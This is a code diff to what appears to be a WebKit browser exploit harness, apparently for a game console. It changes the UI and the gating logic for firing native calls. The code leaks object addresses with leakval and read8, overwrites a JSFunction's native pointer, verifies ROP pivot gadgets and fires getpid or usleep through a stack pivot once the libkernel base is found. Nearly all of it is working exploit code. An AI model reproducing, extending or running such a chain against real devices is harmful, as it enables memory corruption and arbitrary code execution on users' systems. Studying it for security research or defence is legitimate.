@@ -63,7 +63,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830v";
+const BUILD_ID = "rw-20250830x";
 let lkHot = false;
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
@@ -280,10 +280,10 @@ function setUi() {
         const nm = getNativeMode();
         if (nativeStaged) {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
-            btnNative.title = "lk hot after 2e — fire without reload";
+            btnNative.title = "lk hot — Fire getpid without reload";
         } else {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
-            btnNative.title = "Start → 2e Leak+lk → Arm getpid (no reload)";
+            btnNative.title = "smoke: set before Start, or Verify pivot then Fire";
         }
     }
     if (btnLoadCal) {
@@ -673,34 +673,35 @@ function logExtPtrDiag(ptrDiag) {
     }
 }
 
-/** Drop log/retain noise before native fire (2e leaves heavy heap). */
+/** Trim log only — never shift retained (drops nativePrep ArrayBuffers → pivot OOM). */
 function trimBeforeNativeFire() {
     if (lines.length > 16) lines.splice(0, lines.length - 16);
-    while (retained.length > 24) retained.shift();
-    try {
-        if (window._wkCarrier && window._wkCarrier.textarea)
-            retained.push(window._wkCarrier.textarea);
-    } catch (_) { }
 }
 
-/** Fresh slab + expm1 capture — stale prep after 2e OOMs on pivot. */
-function refreshNativePrepBeforeFire(p, off) {
+function gateNativeFire(p, off) {
     const wb = (nativePrep && nativePrep.webkitBase)
         || basesFromSession(off).webkitBase;
-    if (!wb) throw new Error("no webkitBase");
-    const cell = p.leakval(Math.expm1);
-    const jfn = p.read8(cell.add32(0x18));
-    const mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
-    const mainOrig = p.read8(mainMf);
-    if (!mainOrig) throw new Error("nativeFn read failed");
-    const pivotObj = {};
-    const pivotCell = p.leakval(pivotObj);
-    nativePrep = prepNativeChain(p, off, wb, {
-        mainMf, mainOrig, pivotObj, pivotCell,
-    });
-    nativePrep.keepAlive.push(pivotObj);
-    pinNativeRetain();
-    mark("NATIVE-REP", "fresh slab for fire (post-2e safe)");
+    if (!wb) {
+        mark("NATIVE-SKIP", "no webkitBase — Start first");
+        return false;
+    }
+    const v = verifyPivotSet(addr => read1p(p, addr), wb, off);
+    if (!v.ok) {
+        mark("NATIVE-SKIP", "pivot not verified — tap Verify pivot (G0-G5 bytes)");
+        if (v.bad.length)
+            logPivotBadBytes(p, wb, off, v.bad);
+        else if (v.missing.length)
+            mark("PIVOT-MISS", v.missing.join(", "));
+        return false;
+    }
+    return true;
+}
+
+function ensureNativePrepForFire(p, off, nm) {
+    trimBeforeNativeFire();
+    nativePrep = null;
+    ensureNativePrep(p, off);
+    mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
 }
 
 /** One read @ lk+off — pick getpid stub like chain_poops (k_stubs[20] first). */
@@ -730,8 +731,8 @@ function onLkFoundHot(lk, hit) {
     if (addrIn) addrIn.value = String(lk);
     const via = hit ? (hit.method + "/" + hit.via) : "?";
     mark("LK-OK", lk + " (" + via + ") reads=0 — HOT (no reload)");
-    mark("LK-HOT", "tap Arm getpid now — primitive still live");
-    state("lk hot — Arm getpid", "ok");
+    mark("LK-HOT", "tap Fire getpid now — primitive still live");
+    state("lk hot — Fire getpid", "ok");
     try {
         crashLog.append("LK-HOT " + lk + " " + via, "LK-OK");
         crashLog.flushSync();
@@ -2492,8 +2493,8 @@ function acceptLkFromHex(hexOverride) {
     if (asBase.ok) {
         saveLibkernelSession(ptr, null, { forced: true });
         if (addrIn) addrIn.value = String(ptr);
-        mark("LK-OK", String(ptr) + " lk base accepted (0 reads) — Start → peek or Arm getpid");
-        state("lk accepted — Start (no reload)", "ok");
+        mark("LK-OK", String(ptr) + " lk accepted (0 reads) — Fire getpid when ready");
+        state("lk accepted", "ok");
         renderOut();
         try {
             crashLog.append("ACCEPT OK okage " + hex, "LK-VERIFY");
@@ -2508,8 +2509,8 @@ function acceptLkFromHex(hexOverride) {
         saveLibkernelSession(h.lk, null, { forced: true });
         if (addrIn) addrIn.value = String(h.lk);
         mark("LK-OK", String(h.lk) + " = fn−" + h.key
-            + "+0x" + h.rva.toString(16) + " (0 reads) — Start → peek or Arm getpid");
-        state("lk accepted — Start (no reload)", "ok");
+            + "+0x" + h.rva.toString(16) + " (0 reads) — Fire getpid when ready");
+        state("lk accepted", "ok");
         renderOut();
         try {
             crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk, "LK-VERIFY");
@@ -3528,10 +3529,14 @@ function pinNativeRetain() {
         retained.push(window._wkCarrier.textarea);
 }
 
-/** Fire at PRIMITIVE-OK — chain_poops never returns to UI before first expm1. */
+/** No auto native @ Start — smoke/getpid OOMs tab before Fire button. Use ?nativeauto=1 to restore. */
 function tryNativeFireAtStart(p, off) {
     if (nativeFireOff() || !nativePrep) return;
     const nm = getNativeMode();
+    if (params.get("nativeauto") !== "1") {
+        mark("NATIVE-HINT", "native=" + nm + " — tap Fire button (Verify pivot first for smoke)");
+        return;
+    }
     nativeQuiet = true;
     lkQuiet = true;
     pinNativeRetain();
@@ -3641,8 +3646,14 @@ function runFireGetpid() {
     const nm = getNativeMode();
     const lk = lkFromUi();
     if (nm !== "smoke" && !lk) {
-        mark("NATIVE-SKIP", "paste lk → Accept lk (optional) → Arm getpid");
+        mark("NATIVE-SKIP", "paste lk → Accept lk → Fire getpid");
         renderOut();
+        return;
+    }
+    if (!gateNativeFire(p, off)) {
+        state("pivot not ready", "warn");
+        renderOut();
+        setUi();
         return;
     }
 
@@ -3651,8 +3662,7 @@ function runFireGetpid() {
     lkQuiet = true;
 
     try {
-        trimBeforeNativeFire();
-        refreshNativePrepBeforeFire(p, off);
+        ensureNativePrepForFire(p, off, nm);
     } catch (prepErr) {
         busy = false;
         nativeQuiet = false;
@@ -3704,7 +3714,7 @@ function runFireGetpid() {
         state("getpid OK pid=" + pid, "ok");
     } else {
         mark("NATIVE-FAIL", (errMsg || "fire failed") + " build=" + BUILD_ID);
-        mark("NATIVE-HINT", "try native: smoke first — OOM with lk ok = bad stub/pivot");
+        mark("NATIVE-HINT", "pivot OOM — tap Verify pivot, fix PIVOT-BAD lines before Fire smoke");
         state("native fire failed", "bad");
     }
     lkHot = false;
@@ -3942,12 +3952,12 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Start → 2e Leak+lk → Arm getpid (same page, no reload)");
+        mark("HINT", "Verify pivot → 2e Leak+lk → Fire getpid (same page, no reload)");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — 2e Leak+lk → Arm getpid", "ok");
+        state("primitive OK — Verify pivot, then Fire smoke/getpid", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -4108,7 +4118,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("Start → 2e Leak+lk → Arm getpid (no reload)", "");
+    state("Start → Verify pivot → Fire smoke or 2e+getpid", "");
 }
 
 function bootUi() {
